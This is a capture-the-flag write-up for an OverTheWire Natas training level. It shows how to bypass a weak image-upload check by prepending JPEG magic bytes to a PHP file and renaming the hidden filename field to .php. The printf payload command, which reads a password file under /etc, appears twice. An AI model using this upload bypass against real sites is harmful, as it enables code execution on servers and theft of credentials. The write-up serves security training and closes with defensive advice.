# Natas 13 → Natas 14

## Level Information

* URL: `http://natas13.natas.labs.overthewire.org`
* Username: `natas13`
* Password: `[REDACTED]`

## Goal

Find the password for the next level, `natas14`.

## Page Observation

When I opened the page, I saw a file upload form:

```text
Choose a JPEG to upload (max 1KB)
```

The page also displayed this message:

```text
For security reasons, we now only accept image files!
```

There was also a link:

```text
View sourcecode
```

This level is similar to Natas 12, but now the server checks whether the uploaded file looks like an image.

## Concept

This level introduces insecure file upload with weak file type validation.

In Natas 12, the server allowed uploading a PHP file by changing the hidden filename extension from `.jpg` to `.php`.

In Natas 13, the server tries to improve security by checking whether the uploaded file is an image. However, the validation is weak because it only checks the file header, also called the file magic bytes.

A JPEG file usually starts with these bytes:

```text
FF D8 FF E0
```

If a PHP file starts with these bytes, the server may think it is a JPEG image, even though it still contains PHP code.

## Source Code Review

After clicking `View sourcecode`, I found that the application checks the uploaded file type. The server attempts to verify that the file is an image before accepting it.

However, the filename is still controlled by a hidden input field:

```html
<input type="hidden" name="filename" value="randomname.jpg">
```

By changing the extension from `.jpg` to `.php`, the uploaded file can still be saved as a PHP file.

## Payload File

I created a file named:

```text
shell.php
```

Instead of using a normal PHP file, I added JPEG magic bytes at the beginning of the file.

The payload was created using Git Bash:

```bash
printf '\xFF\xD8\xFF\xE0<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > shell.php
```

This creates a file that starts like a JPEG image but also contains PHP code.

The PHP code reads the password file for `natas14`:

```php
<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>
```

## Steps

1. Opened the Natas 13 page.
2. Clicked `View sourcecode`.
3. Learned that the server checks whether the uploaded file looks like an image.
4. Created a PHP payload file with JPEG magic bytes.
5. Opened Developer Tools using:

```text
F12
```

6. Went to the `Elements` tab.
7. Searched for:

```text
filename
```

8. Found the hidden filename input:

```html
<input type="hidden" name="filename" value="randomname.jpg">
```

9. Changed the filename extension from `.jpg` to `.php`:

```html
<input type="hidden" name="filename" value="randomname.php">
```

10. Chose the payload file `shell.php`.
11. Clicked `Upload File`.
12. Opened the uploaded `.php` file link.
13. The server executed the PHP code and displayed the password for `natas14`.

## Browser Method

Change the hidden filename from:

```text
randomname.jpg
```

to:

```text
randomname.php
```

Upload the payload file:

```text
shell.php
```

Payload creation command:

```bash
printf '\xFF\xD8\xFF\xE0<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > shell.php
```

After uploading, open the uploaded file:

```text
http://natas13.natas.labs.overthewire.org/upload/[uploaded-file-name].php
```

## Result

After opening the uploaded `.php` file, the server executed the PHP code and displayed the password for `natas14`.

## Lesson Learned

Checking only the file extension or file header is not enough to secure file uploads.

An attacker can create a file that looks like an image but still contains executable code. To prevent this, developers should validate file content securely, rename uploaded files safely, store uploads outside the web root, and disable script execution in upload directories.

## Password

```text
[REDACTED]
```
